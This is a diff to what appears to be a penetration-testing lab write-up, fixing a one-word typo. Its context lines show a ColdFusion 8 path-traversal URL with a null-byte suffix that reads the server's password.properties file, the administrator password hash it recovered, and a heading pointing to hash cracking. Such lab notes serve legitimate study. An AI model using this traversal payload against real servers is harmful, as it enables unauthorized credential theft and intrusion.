@@ -47,7 +47,7 @@ Run the exploit on the browser as well
 ### http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
 ![cf8_passwd.png](../../_resources/fce1ee7db2b341b7a3b9d4dd8ce48813.png)
 
-The Administrator has is found: 
+The Administrator hash is found: 
 ### AAFDC23870ECBCD3D557B6423A8982134E17927E
 
 # Crackstation
